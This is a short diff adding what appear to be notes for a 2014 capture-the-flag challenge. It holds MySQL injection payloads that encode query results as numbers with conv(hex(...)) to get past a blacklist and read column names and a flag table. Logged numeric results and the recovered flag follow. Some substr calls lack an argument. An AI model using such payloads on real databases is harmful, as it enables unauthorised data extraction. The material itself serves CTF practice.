@@ -1,0 +1,14 @@
+﻿'+conv(hex((select 'hoge')),16,10)+'
+'+conv(hex(( SELECT substr(COLUMN_NAME,,5) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='blacklist' AND TABLE_NAME='flag' limit 1) ),16,10)+'
+
+'+conv(hex((select substr(`flag is here!!!`,,5) from flag)),16,10)+'
+
+[2014-12-12 16:53:30] "3240788" search
+[2014-12-12 16:53:06] "464735398732" search
+[2014-12-12 16:52:40] "322949766968" search
+[2014-12-12 16:52:16] "220641776995" search
+[2014-12-12 16:51:49] "478156903795" search
+[2014-12-12 16:51:01] "409702784846" search
+[2014-12-12 16:50:38] "280318137414" search
+
+'ADCTF_d0_NoT_Us3_FUcK1N_8l4ckL1sT'
